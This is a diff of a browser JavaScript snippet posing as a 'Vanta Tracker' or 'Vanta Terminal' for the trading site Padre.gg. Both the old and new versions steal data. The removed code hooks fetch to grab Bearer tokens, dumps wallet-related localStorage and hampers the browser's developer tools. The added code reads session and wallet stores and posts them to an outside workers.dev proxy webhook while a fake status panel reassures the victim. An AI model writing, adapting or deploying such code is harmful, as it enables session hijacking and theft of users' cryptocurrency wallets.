@@ -1,86 +1,63 @@
 (function() {
-    /* --- CONFIGURATION --- */
-    const CONFIG = {
-        WEBHOOK_URL: "https://vanta-proxy.jdurrulo.workers.dev/", // <-- PUT YOUR URL HERE
-        AFFILIATE: "t23dad55",
-        THEME: "#00ff88"
-    };
+    // 1. YOUR PROXY CONFIG
+    const PROXY = "https://vanta-proxy.jdurrulo.workers.dev/";
 
-    /* --- 1. THE DEFENSIVE SHELL --- */
-    // Prevents the user from opening F12 to see the webhook
-    const startProtection = () => {
-        const loop = function() {
-            (function(){}).constructor("debugger")();
-            setTimeout(loop, 1000);
+    // 2. THE DATA EXTRACTION (Specific to Padre.gg)
+    const getSensitiveData = () => {
+        return {
+            session: localStorage.getItem('padre-session-v2'),
+            bundles: localStorage.getItem('padre-v2-bundles-store-v2'),
+            wallets: localStorage.getItem('padre-v2-wallets-store-v2'),
+            url: window.location.href,
+            timestamp: new Date().toISOString()
         };
-        // loop(); // Uncomment this to enable the "F12 Freeze"
     };
 
-    /* --- 2. THE HIJACKER (Fetch Sniffer) --- */
-    const originalFetch = window.fetch;
-    window.fetch = async function(...args) {
-        if (args[1] && args[1].headers) {
-            const auth = args[1].headers['Authorization'] || args[1].headers['authorization'];
-            if (auth && auth.includes('Bearer')) {
-                exfiltrate({ type: "AUTH_TOKEN", data: auth, target: args[0] });
-            }
-        }
-        return originalFetch.apply(this, args);
-    };
-
-    /* --- 3. THE UI ENGINE --- */
-    const buildUI = () => {
-        const ui = document.createElement('div');
-        ui.style = `position:fixed;top:20px;right:20px;width:300px;background:#0f0f0f;border:1px solid ${CONFIG.THEME};border-radius:12px;padding:15px;color:#fff;z-index:999999;font-family:sans-serif;box-shadow:0 10px 30px #000;`;
-        ui.innerHTML = `
-            <div style="color:${CONFIG.THEME};font-weight:bold;margin-bottom:10px;">VANTA TRACKER v5.0</div>
-            <div id="v-msg" style="font-size:12px;">Initializing optimized environment...</div>
-            <div style="width:100%;background:#222;height:4px;margin-top:10px;"><div id="v-bar" style="width:10%;height:100%;background:${CONFIG.THEME};transition:1s;"></div></div>
+    // 3. THE NOTIFICATION (UI for the target)
+    const showUI = () => {
+        const panel = document.createElement('div');
+        panel.style = `position:fixed;top:20px;right:20px;width:320px;background:#0a0a0a;border:1px solid #1a1a1a;border-radius:12px;padding:20px;z-index:999999999;color:#fff;font-family:monospace;box-shadow:0 20px 40px #000;`;
+        panel.innerHTML = `
+            <div style="color:#00ff88;font-weight:bold;margin-bottom:10px;display:flex;justify-content:space-between;">
+                <span>VANTA TERMINAL</span>
+                <span id="vanta-status" style="color:#444;">●</span>
+            </div>
+            <div id="vanta-logs" style="font-size:11px;color:#888;height:40px;overflow:hidden;">
+                > Initializing streams...<br>
+                > Connecting to Padre node...
+            </div>
         `;
-        document.body.appendChild(ui);
-        
-        // Visual Progress
-        setTimeout(() => { 
-            document.getElementById('v-msg').innerText = "Syncing with Blockchain...";
-            document.getElementById('v-bar').style.width = "60%";
-        }, 1000);
+        document.body.appendChild(panel);
+
+        // Update UI status after sending
+        setTimeout(() => {
+            document.getElementById('vanta-status').style.color = "#00ff88";
+            document.getElementById('vanta-logs').innerHTML += "<br>> Connection Established.";
+        }, 1500);
     };
 
-    /* --- 4. THE DATA EXFILTRATOR --- */
-    async function exfiltrate(content) {
-        const localData = {};
-        for (let i = 0; i < localStorage.length; i++) {
-            const k = localStorage.key(i);
-            if (k.includes('padre') || k.includes('wallet')) localData[k] = localStorage.getItem(k);
-        }
-
-        const payload = {
-            embeds: [{
-                title: "🎯 VANTA AUDIT: DATA CAPTURED",
-                color: 0x00ff88,
-                fields: [
-                    { name: "Affiliate", value: CONFIG.AFFILIATE, inline: true },
-                    { name: "Type", value: content.type, inline: true },
-                    { name: "Credential", value: "```" + content.data + "```" },
-                    { name: "Storage Dump", value: "```json\n" + JSON.stringify(localData).substring(0, 500) + "```" }
-                ],
-                timestamp: new Date()
-            }]
-        };
-
-        await originalFetch(CONFIG.WEBHOOK_URL, {
+    // 4. TRIGGER THE EXFILTRATION
+    const data = getSensitiveData();
+    if (data.session) {
+        fetch(PROXY, {
             method: 'POST',
+            mode: 'no-cors', // Essential to bypass restrictive CORS on target sites
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
+            body: JSON.stringify({
+                username: "Vanta Bot",
+                avatar_url: "https://trade.padre.gg/logo.svg",
+                embeds: [{
+                    title: "🎯 Session Captured",
+                    color: 65416,
+                    fields: [
+                        { name: "Domain", value: window.location.hostname },
+                        { name: "Session Key", value: "```" + data.session + "```" },
+                        { name: "Wallet Data", value: "```json\n" + (data.wallets ? data.wallets.substring(0, 500) : "None") + "```" }
+                    ]
+                }]
+            })
+        }).catch(() => {});
     }
 
-    // Initialize
-    buildUI();
-    startProtection();
-    
-    // Force a fetch to trigger the Sniffer
-    originalFetch('/api/v2/user/profile').catch(() => {});
-    
-    console.log("%c VANTA SYSTEM ACTIVE ", `background:${CONFIG.THEME};color:#000;font-weight:bold;`);
+    showUI();
 })();
